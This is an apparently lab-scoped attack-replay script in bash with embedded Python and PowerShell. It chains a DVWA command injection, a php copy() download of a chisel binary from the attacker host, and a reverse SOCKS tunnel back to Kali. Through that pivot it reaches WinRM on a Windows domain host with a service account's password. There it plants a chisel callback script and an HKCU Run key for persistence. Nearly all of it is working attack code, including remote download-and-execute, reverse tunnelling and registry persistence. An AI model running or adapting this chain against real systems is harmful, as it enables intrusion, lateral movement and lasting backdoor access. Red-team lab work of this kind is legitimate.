#!/usr/bin/env bash
set -Eeuo pipefail

run_id="${1:-}"
kali_address="${2:-}"
dvwa_address="${3:-}"
dvwa_port="${4:-}"
windows_address="${5:-}"
windows_port="${6:-}"
domain_user="${7:-}"
user_sid="${8:-}"
static_chisel_path="${9:-}"
static_chisel_sha256="${10:-}"
windows_chisel_source="${11:-}"
windows_chisel_sha256="${12:-}"
proxy_config="${13:-}"

callback_port="443"
dmz_socks_port="1080"
persistence_socks_port="1082"
psrp_python='/home/kali/.local/share/pb05-replay/venv/bin/python'
windows_chisel_path='C:\Users\svc_web\Documents\chisel.exe'
windows_script_path='C:\Users\svc_web\AppData\Local\PFA-Lab\pfa-tunnel.ps1'
run_value_name='PFA-Lab-Tunnel'

if [[ ! "$run_id" =~ ^PTR-[0-9]{8}T[0-9]{6}Z-[0-9a-f]{8}$ ||
      "$kali_address" != "192.168.111.144" ||
      "$dvwa_address" != "192.168.111.128" ||
      "$dvwa_port" != "8080" ||
      "$windows_address" != "10.10.30.20" ||
      "$windows_port" != "5985" ||
      "$domain_user" != 'LAB\svc_web' ||
      "$user_sid" != 'S-1-5-21-722403993-16450863-2166090910-1106' ||
      "$static_chisel_path" != '/home/kali/pfa-evidence/phase3-pivot/chisel-static' ||
      "$windows_chisel_source" != '/home/kali/pfa-evidence/phase3-pivot/chisel.exe' ||
      "$proxy_config" != '/home/kali/pfa-evidence/phase3-pivot/proxychains-dmz.conf' ]]; then
    printf 'LIVE_STATUS=REFUSED_OUTSIDE_DOCUMENTED_PB05_SCOPE\n'
    exit 40
fi

umask 077
cookie_jar="$(mktemp /tmp/pb05-dvwa-cookies.XXXXXX)"
login_page="$(mktemp /tmp/pb05-dvwa-login.XXXXXX)"
auth_page="$(mktemp /tmp/pb05-dvwa-auth.XXXXXX)"
exec_page="$(mktemp /tmp/pb05-dvwa-exec.XXXXXX)"
http_pid=''
chisel_pid=''
chisel_started_here=0
completed=0

is_listening() {
    local port="$1"
    ss -lntH | awk '{print $4}' | grep -Eq "(^|:)${port}$"
}

stop_root_pid() {
    local pid="$1"
    if [[ -n "$pid" && "$pid" =~ ^[0-9]+$ ]]; then
        sudo -n kill "$pid" >/dev/null 2>&1 || true
        for _ in 1 2 3 4 5; do
            sudo -n kill -0 "$pid" >/dev/null 2>&1 || return 0
            sleep 1
        done
        sudo -n kill -KILL "$pid" >/dev/null 2>&1 || true
    fi
}

cleanup() {
    unset dvwa_password windows_password 2>/dev/null || true
    stop_root_pid "$http_pid"
    if [[ "$completed" -ne 1 && "$chisel_started_here" -eq 1 ]]; then
        stop_root_pid "$chisel_pid"
    fi
    rm -f -- "$cookie_jar" "$login_page" "$auth_page" "$exec_page"
}
trap cleanup EXIT

for tool in curl grep sed awk sha256sum python3 proxychains4 nc ss sudo; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        printf 'MISSING_TOOL=%s\n' "$tool"
        printf 'LIVE_STATUS=MISSING_REQUIRED_TOOL\n'
        exit 41
    fi
done

if [[ ! -x "$psrp_python" ]]; then
    printf 'PYPSRP_VENV_MISSING=%s\n' "$psrp_python"
    printf 'LIVE_STATUS=MISSING_REQUIRED_TOOL\n'
    exit 41
fi

if ! "$psrp_python" -c 'import pypsrp' >/dev/null 2>&1; then
    printf 'MISSING_PYTHON_MODULE=pypsrp\n'
    printf 'LIVE_STATUS=MISSING_REQUIRED_TOOL\n'
    exit 41
fi

if [[ ! -x "$static_chisel_path" ]] ||
   [[ "$(sha256sum "$static_chisel_path" | awk '{print $1}')" != "$static_chisel_sha256" ]]; then
    printf 'LIVE_STATUS=STATIC_CHISEL_VALIDATION_FAILED\n'
    exit 42
fi

if [[ ! -f "$windows_chisel_source" ]] ||
   [[ "$(sha256sum "$windows_chisel_source" | awk '{print toupper($1)}')" != "${windows_chisel_sha256^^}" ]]; then
    printf 'LIVE_STATUS=WINDOWS_CHISEL_VALIDATION_FAILED\n'
    exit 43
fi

if ! grep -Eq '^socks5[[:space:]]+127\.0\.0\.1[[:space:]]+1080[[:space:]]*$' "$proxy_config"; then
    printf 'LIVE_STATUS=PROXY_CONFIG_VALIDATION_FAILED\n'
    exit 44
fi

printf 'PB05 live replay needs Kali sudo, DVWA admin, and LAB\\svc_web credentials.\n'
printf '\n[1/3] Kali sudo authentication\n'
sudo -v </dev/tty
printf '\n[2/3] DVWA web authentication\n'
read -rsp 'Enter DVWA admin password: ' dvwa_password </dev/tty
printf '\n'
dvwa_password="${dvwa_password%$'\r'}"

target="http://${dvwa_address}:${dvwa_port}"
curl -fsS -c "$cookie_jar" "$target/login.php" -o "$login_page"
token="$(grep -oP "name=['\"]user_token['\"] value=['\"]\K[^'\"]+" "$login_page" | head -n 1 || true)"
if [[ -z "$token" ]]; then
    printf 'LIVE_STATUS=DVWA_TOKEN_NOT_FOUND\n'
    exit 45
fi

printf '%s' "$dvwa_password" | curl -fsS -L \
    -b "$cookie_jar" -c "$cookie_jar" \
    --data-urlencode 'username=admin' \
    --data-urlencode 'password@-' \
    --data-urlencode 'Login=Login' \
    --data-urlencode "user_token=$token" \
    "$target/login.php" -o "$auth_page"
unset dvwa_password token

curl -fsS -b "$cookie_jar" -b 'security=low' \
    "$target/vulnerabilities/exec/" -o "$exec_page"
if ! grep -Eqi 'Command Injection|Ping a device|vulnerabilities/exec' "$exec_page"; then
    printf 'LIVE_STATUS=DVWA_AUTHENTICATION_FAILED\n'
    exit 46
fi
printf 'DVWA_AUTHENTICATION=VERIFIED\n'

printf '\n[3/3] Windows domain authentication\n'
read -rsp 'Enter LAB\\svc_web password: ' windows_password </dev/tty
printf '\n'
windows_password="${windows_password%$'\r'}"

dvwa_exec() {
    local command="$1"
    local output_path="$2"
    curl -fsS --max-time 60 \
        -b "$cookie_jar" -b 'security=low' \
        -A "PB05-ATTACK-REPLAY-${run_id}" \
        --data-urlencode "ip=127.0.0.1; ${command}" \
        --data-urlencode 'Submit=Submit' \
        "$target/vulnerabilities/exec/" -o "$output_path"
}

dvwa_exec 'if [ -x /tmp/chisel ]; then sha256sum /tmp/chisel; else echo CHISEL_MISSING; fi' "$exec_page"
if grep -qi "$static_chisel_sha256" "$exec_page"; then
    printf 'DMZ_CHISEL=ALREADY_PRESENT_AND_VERIFIED\n'
else
    if is_listening "$callback_port"; then
        printf 'LIVE_STATUS=CALLBACK_PORT_IN_USE_AND_TRANSFER_REQUIRED\n'
        exit 47
    fi

    static_directory="$(dirname "$static_chisel_path")"
    http_log="/tmp/pb05-http-${run_id}.log"
    http_pid="$(sudo -n sh -c "nohup python3 -m http.server '$callback_port' --bind 0.0.0.0 --directory '$static_directory' >'$http_log' 2>&1 & echo \$!")"
    for _ in 1 2 3 4 5 6 7 8 9 10; do
        is_listening "$callback_port" && break
        sleep 1
    done
    if ! is_listening "$callback_port"; then
        printf 'LIVE_STATUS=TEMPORARY_TRANSFER_SERVER_FAILED\n'
        exit 48
    fi

    transfer_command="php -r 'copy(\"http://${kali_address}:${callback_port}/$(basename "$static_chisel_path")\",\"/tmp/chisel\");'; chmod +x /tmp/chisel; sha256sum /tmp/chisel"
    dvwa_exec "$transfer_command" "$exec_page"
    if ! grep -qi "$static_chisel_sha256" "$exec_page"; then
        printf 'LIVE_STATUS=DMZ_CHISEL_TRANSFER_VALIDATION_FAILED\n'
        exit 49
    fi
    printf 'DMZ_CHISEL=TRANSFERRED_AND_VERIFIED\n'

    stop_root_pid "$http_pid"
    http_pid=''
    for _ in 1 2 3 4 5; do
        is_listening "$callback_port" || break
        sleep 1
    done
fi

if is_listening "$callback_port"; then
    if ! pgrep -af -- "$static_chisel_path server --reverse --port $callback_port" >/dev/null 2>&1; then
        printf 'LIVE_STATUS=CALLBACK_PORT_OWNED_BY_UNEXPECTED_PROCESS\n'
        exit 50
    fi
    printf 'KALI_CHISEL_SERVER=REUSED\n'
else
    server_log="/home/kali/pfa-evidence/phase3-pivot/pb05-replay-${run_id}.log"
    chisel_pid="$(sudo -n sh -c "nohup '$static_chisel_path' server --reverse --port '$callback_port' >'$server_log' 2>&1 & echo \$!")"
    chisel_started_here=1
    for _ in 1 2 3 4 5 6 7 8 9 10; do
        is_listening "$callback_port" && break
        sleep 1
    done
    if ! is_listening "$callback_port"; then
        printf 'LIVE_STATUS=CHISEL_SERVER_START_FAILED\n'
        exit 51
    fi
    printf 'KALI_CHISEL_SERVER=STARTED:%s\n' "$server_log"
fi

if is_listening "$dmz_socks_port"; then
    printf 'DMZ_SOCKS_1080=REUSED\n'
else
    dvwa_exec "nohup /tmp/chisel client http://${kali_address}:${callback_port} R:${dmz_socks_port}:socks >/tmp/pb05-chisel-client.log 2>&1 &" "$exec_page"
    for _ in $(seq 1 20); do
        is_listening "$dmz_socks_port" && break
        sleep 1
    done
    if ! is_listening "$dmz_socks_port"; then
        printf 'LIVE_STATUS=DMZ_SOCKS_START_FAILED\n'
        exit 52
    fi
    printf 'DMZ_SOCKS_1080=STARTED\n'
fi

if ! proxychains4 -q -f "$proxy_config" nc -zvw8 "$windows_address" "$windows_port" >/dev/null 2>&1; then
    printf 'LIVE_STATUS=WINRM_UNREACHABLE_THROUGH_DMZ_SOCKS\n'
    exit 53
fi
printf 'WINRM_THROUGH_DMZ_SOCKS=VERIFIED\n'

"$psrp_python" - "$proxy_config" "$windows_address" "$domain_user" "$user_sid" \
    "$windows_chisel_source" "$windows_chisel_sha256" "$windows_chisel_path" \
    "$windows_script_path" "$run_value_name" "$kali_address" "$callback_port" \
    "$persistence_socks_port" 3<<<"$windows_password" <<'PYTHON'
import base64
import hashlib
import json
import os
import re
import select
import socket
import struct
import sys
import threading

from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan

(
    proxy_config,
    windows_address,
    domain_user,
    user_sid,
    chisel_source,
    chisel_sha256,
    chisel_path,
    script_path,
    run_value_name,
    callback_address,
    callback_port,
    socks_port,
) = sys.argv[1:]

with os.fdopen(3, 'r', encoding='utf-8', errors='strict') as password_stream:
    password = password_stream.read().rstrip('\r\n')
if not password:
    print('PYPSRP_STATUS=EMPTY_PASSWORD_REFUSED')
    raise SystemExit(61)

def recv_exact(stream, count):
    data = bytearray()
    while len(data) < count:
        chunk = stream.recv(count - len(data))
        if not chunk:
            raise ConnectionError('SOCKS5_UNEXPECTED_EOF')
        data.extend(chunk)
    return bytes(data)


def open_socks_connection():
    upstream = socket.create_connection(('127.0.0.1', 1080), timeout=10)
    upstream.sendall(b'\x05\x01\x00')
    if recv_exact(upstream, 2) != b'\x05\x00':
        raise ConnectionError('SOCKS5_METHOD_NEGOTIATION_FAILED')

    upstream.sendall(
        b'\x05\x01\x00\x01'
        + socket.inet_aton(windows_address)
        + struct.pack('!H', 5985)
    )
    header = recv_exact(upstream, 4)
    if header[0] != 5 or header[1] != 0:
        raise ConnectionError('SOCKS5_CONNECT_FAILED_' + str(header[1]))
    if header[3] == 1:
        recv_exact(upstream, 4)
    elif header[3] == 3:
        recv_exact(upstream, recv_exact(upstream, 1)[0])
    elif header[3] == 4:
        recv_exact(upstream, 16)
    else:
        raise ConnectionError('SOCKS5_INVALID_ADDRESS_TYPE')
    recv_exact(upstream, 2)
    upstream.settimeout(None)
    return upstream


relay_stop = threading.Event()
relay_listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
relay_listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
relay_listener.bind(('127.0.0.1', 0))
relay_listener.listen(16)
relay_listener.settimeout(1)
relay_port = relay_listener.getsockname()[1]


def relay_connection(client):
    upstream = None
    try:
        upstream = open_socks_connection()
        while not relay_stop.is_set():
            readable, _, _ = select.select([client, upstream], [], [], 1)
            for source in readable:
                data = source.recv(65536)
                if not data:
                    return
                destination = upstream if source is client else client
                destination.sendall(data)
    except (ConnectionError, OSError):
        return
    finally:
        try:
            client.close()
        except OSError:
            pass
        if upstream is not None:
            try:
                upstream.close()
            except OSError:
                pass


def accept_relay_connections():
    while not relay_stop.is_set():
        try:
            client, _ = relay_listener.accept()
        except socket.timeout:
            continue
        except OSError:
            return
        threading.Thread(target=relay_connection, args=(client,), daemon=True).start()


relay_thread = threading.Thread(target=accept_relay_connections, daemon=True)
relay_thread.start()
print('WINRM_LOCAL_SOCKS_RELAY=LISTENING_127.0.0.1_' + str(relay_port))

# Confirm that the SOCKS relay carries an actual HTTP exchange, not merely a
# successful TCP handshake. WinRM should reject this unauthenticated request
# with an HTTP response before the authenticated client is launched.
response_head = ''
probe_error = ''
try:
    probe = socket.create_connection(('127.0.0.1', relay_port), timeout=10)
    probe.settimeout(20)
    probe.sendall(
        (
            'POST /wsman HTTP/1.1\r\n'
            f'Host: {windows_address}:5985\r\n'
            'Content-Length: 0\r\n'
            'Connection: close\r\n\r\n'
        ).encode('ascii')
    )
    response_head = probe.recv(4096).decode('iso-8859-1', errors='replace')
except (ConnectionError, OSError) as exc:
    probe_error = type(exc).__name__.upper()
finally:
    try:
        probe.close()
    except (NameError, OSError):
        pass

status_match = re.match(r'HTTP/\d(?:\.\d)?\s+(\d{3})', response_head)
if not status_match:
    suffix = '_' + probe_error if probe_error else ''
    print('WINRM_HTTP_THROUGH_SOCKS_RELAY=NO_HTTP_RESPONSE' + suffix)
    raise SystemExit(62)
print('WINRM_HTTP_THROUGH_SOCKS_RELAY=HTTP_' + status_match.group(1))

script_text = f'''$Marker = "PFA_PERSISTENCE_C2_01"
$LogFile = "$env:LOCALAPPDATA\\PFA-Lab\\execution.log"
$Chisel = "$env:USERPROFILE\\Documents\\chisel.exe"

"$(Get-Date -Format o) $Marker started" |
    Add-Content -Path $LogFile

$ExistingProcess = @(
    Get-Process -Name chisel -ErrorAction SilentlyContinue |
        Where-Object {{
            try {{ $_.Path -eq $Chisel }}
            catch {{ $false }}
        }}
) | Sort-Object StartTime -Descending | Select-Object -First 1

if ($null -ne $ExistingProcess) {{
    "$(Get-Date -Format o) $Marker reused PID $($ExistingProcess.Id)" |
        Add-Content -Path $LogFile
    Write-Output "PB05_CHISEL_PID=$($ExistingProcess.Id)"
    exit 0
}}

$StartedProcess = Start-Process `
    -FilePath $Chisel `
    -ArgumentList "client http://{callback_address}:{callback_port} R:{socks_port}:socks" `
    -WindowStyle Minimized `
    -PassThru

Write-Output "PB05_CHISEL_PID=$($StartedProcess.Id)"
'''.replace('\n', '\r\n')
script_bytes = script_text.encode('utf-8')
script_bytes_b64 = base64.b64encode(script_bytes).decode('ascii')
script_sha256 = hashlib.sha256(script_bytes).hexdigest().upper()

payload = r'''
$ErrorActionPreference = 'Stop'
Write-Output 'PB05_REMOTE_STAGE=IDENTITY_VALIDATION'
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
if ($identity.User.Value -ne '__USER_SID__') { throw 'PB05_USER_SID_MISMATCH' }
$scriptPath = '__SCRIPT_PATH__'
$chiselPath = '__CHISEL_PATH__'
$scriptDirectory = Split-Path -Parent $scriptPath
Write-Output 'PB05_REMOTE_STAGE=CREATE_SCRIPT_DIRECTORY'
New-Item -ItemType Directory -Path $scriptDirectory -Force | Out-Null
Write-Output 'PB05_REMOTE_STAGE=WRITE_PERSISTENCE_SCRIPT'
[IO.File]::WriteAllBytes($scriptPath, [Convert]::FromBase64String('__SCRIPT_BYTES_B64__'))
Write-Output 'PB05_REMOTE_STAGE=VERIFY_SCRIPT_HASH'
if ((Get-FileHash -Algorithm SHA256 -LiteralPath $scriptPath).Hash -ne '__SCRIPT_SHA256__') { throw 'PB05_SCRIPT_HASH_MISMATCH' }
Write-Output 'PB05_REMOTE_STAGE=VERIFY_CHISEL_HASH'
if ((Get-FileHash -Algorithm SHA256 -LiteralPath $chiselPath).Hash -ne '__CHISEL_SHA256__') { throw 'PB05_CHISEL_HASH_MISMATCH' }
$runData = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -File "' + $scriptPath + '"'
Write-Output 'PB05_REMOTE_STAGE=SET_RUN_VALUE'
New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '__RUN_VALUE_NAME__' -PropertyType String -Value $runData -Force | Out-Null
Write-Output 'PB05_REMOTE_STAGE=START_PERSISTENCE_SCRIPT'
$launchOutput = @(& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $scriptPath)
$pidMarker = @($launchOutput | Where-Object { "$_" -match '^PB05_CHISEL_PID=\d+$' } | Select-Object -Last 1)
if ($pidMarker.Count -ne 1) { throw 'PB05_CHISEL_PID_NOT_RETURNED' }
$pidMatch = [regex]::Match("$($pidMarker[0])", '^PB05_CHISEL_PID=(\d+)$')
if (-not $pidMatch.Success) { throw 'PB05_CHISEL_PID_INVALID' }
$chiselProcessId = [int] $pidMatch.Groups[1].Value
Start-Sleep -Seconds 5
Write-Output 'PB05_REMOTE_STAGE=VERIFY_LAUNCHED_PROCESS'
$matching = @(Get-Process -Id $chiselProcessId -ErrorAction Stop | Where-Object { $_.ProcessName -eq 'chisel' })
if ($matching.Count -lt 1) { throw 'PB05_CHISEL_PROCESS_NOT_OBSERVED' }
Write-Output 'PB05_REMOTE_STAGE=VERIFY_RUN_VALUE'
$actualRunData = (Get-ItemProperty -LiteralPath 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name '__RUN_VALUE_NAME__').'__RUN_VALUE_NAME__'
if ($actualRunData -ne $runData) { throw 'PB05_RUN_VALUE_MISMATCH' }
Write-Output 'PB05_REMOTE_STAGE=BUILD_VERIFIED_STATE'
$state = [ordered]@{
    marker = 'PFA_PERSISTENCE_C2_01'
    user = $identity.Name
    user_sid = $identity.User.Value
    script_path = $scriptPath
    script_sha256 = '__SCRIPT_SHA256__'
    chisel_path = $chiselPath
    chisel_sha256 = '__CHISEL_SHA256__'
    run_value_name = '__RUN_VALUE_NAME__'
    run_value_data = $actualRunData
    process_ids = @($chiselProcessId)
    callback = '__CALLBACK_ADDRESS__:__CALLBACK_PORT__'
    reverse_socks_port = [int] __SOCKS_PORT__
}
$json = $state | ConvertTo-Json -Depth 5 -Compress
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($json))
Write-Output "PB05_REMOTE_STATE_B64=$encoded"
'''

replacements = {
    '__USER_SID__': user_sid,
    '__SCRIPT_PATH__': script_path,
    '__CHISEL_PATH__': chisel_path,
    '__SCRIPT_BYTES_B64__': script_bytes_b64,
    '__SCRIPT_SHA256__': script_sha256,
    '__CHISEL_SHA256__': chisel_sha256.upper(),
    '__RUN_VALUE_NAME__': run_value_name,
    '__CALLBACK_ADDRESS__': callback_address,
    '__CALLBACK_PORT__': callback_port,
    '__SOCKS_PORT__': socks_port,
}
for key, value in replacements.items():
    payload = payload.replace(key, value)

def decode_output(value):
    if isinstance(value, bytes):
        return value.decode('utf-8', errors='replace')
    return str(value or '')


def safe_detail(value):
    detail = decode_output(value)
    if password:
        detail = detail.replace(password, '<REDACTED>')
    detail = detail.replace(domain_user, '<DOMAIN_USER>')
    detail = re.sub(r'[\r\n]+', ' | ', detail).strip()
    return re.sub(r'[^\x20-\x7e]', '?', detail)[-500:]


# pypsrp opens the named Microsoft.PowerShell endpoint that authorizes members
# of Remote Management Users. The loopback relay still carries every WSMan
# connection through the existing DMZ SOCKS pivot. NTLM avoids relying on a
# KDC path from Kali, and message encryption remains enabled over WinRM HTTP.
wsman = WSMan(
    server='127.0.0.1',
    port=relay_port,
    path='wsman',
    ssl=False,
    auth='ntlm',
    username=domain_user,
    password=password,
    cert_validation=False,
    encryption='auto',
    connection_timeout=30,
    read_timeout=180,
    operation_timeout=170,
    no_proxy=True,
)
pool = RunspacePool(
    wsman,
    configuration_name='Microsoft.PowerShell',
    idle_timeout=7200,
)
pool_opened = False
pool_disconnected = False
try:
    print('PYPSRP_STATUS=CONNECTING_MICROSOFT_POWERSHELL')
    pool.open()
    pool_opened = True
    print('PYPSRP_STATUS=AUTHENTICATED')
    ps = PowerShell(pool)
    ps.add_script(payload)
    output = ps.invoke()
    output_text = '\n'.join(str(item) for item in output)
    if ps.had_errors:
        error_text = '\n'.join(str(item) for item in ps.streams.error)
        stage_matches = re.findall(r'PB05_REMOTE_STAGE=([A-Z0-9_]+)', output_text)
        if stage_matches:
            print('PB05_REMOTE_FAILURE_STAGE=' + stage_matches[-1])
        detail = safe_detail(error_text or output_text)
        if detail:
            print('PYPSRP_REMOTE_ERROR=' + detail)
        print('PYPSRP_STATUS=REMOTE_APPLY_FAILED')
        raise SystemExit(63)

    state_match = re.search(r'PB05_REMOTE_STATE_B64=([A-Za-z0-9+/=]+)', output_text)
    if not state_match:
        detail = safe_detail(output_text)
        if detail:
            print('PYPSRP_REMOTE_OUTPUT=' + detail)
        print('PYPSRP_STATUS=REMOTE_STATE_MISSING')
        raise SystemExit(63)
    state = json.loads(base64.b64decode(state_match.group(1)).decode('utf-8'))
    pool.disconnect()
    pool_disconnected = True
    print('PYPSRP_RUNSPACE=DISCONNECTED_IDLE_TIMEOUT_7200_SECONDS')
except SystemExit:
    raise
except Exception as exc:
    print('PYPSRP_EXCEPTION=' + type(exc).__name__)
    detail = safe_detail(exc)
    if detail:
        print('PYPSRP_EXCEPTION_DETAIL=' + detail)
    print('PYPSRP_STATUS=CONNECTION_OR_EXECUTION_FAILED')
    raise SystemExit(64)
finally:
    password = ''
    if pool_opened and not pool_disconnected:
        try:
            pool.close()
        except Exception:
            pass
    try:
        wsman.close()
    except Exception:
        pass
    relay_stop.set()
    try:
        relay_listener.close()
    except OSError:
        pass

print('WINDOWS_CHISEL_PREREQUISITE=VALIDATED_BY_REMOTE_PAYLOAD')
print('WINDOWS_PERSISTENCE=CREATED_AND_VERIFIED')
print('WINDOWS_CALLBACK_PROCESS=STARTED_AND_VERIFIED')
print('PB05_WINDOWS_STATE=' + json.dumps(state, sort_keys=True, separators=(',', ':')))
print('PYPSRP_STATUS=COMPLETED')
PYTHON
unset windows_password

for _ in $(seq 1 20); do
    is_listening "$persistence_socks_port" && break
    sleep 1
done
if ! is_listening "$persistence_socks_port"; then
    printf 'LIVE_STATUS=PERSISTENCE_SOCKS_NOT_OBSERVED\n'
    exit 54
fi

printf 'PERSISTENCE_SOCKS_1082=VERIFIED\n'
printf 'ATTACK_CHAIN_BOUNDARY=PB05_STATE_ESTABLISHED\n'
printf 'MONITORING_AND_RESPONSE=OUT_OF_SCOPE_NOT_STARTED\n'
printf 'LIVE_STATUS=PB05_ATTACK_REPLAY_COMPLETED\n'
completed=1
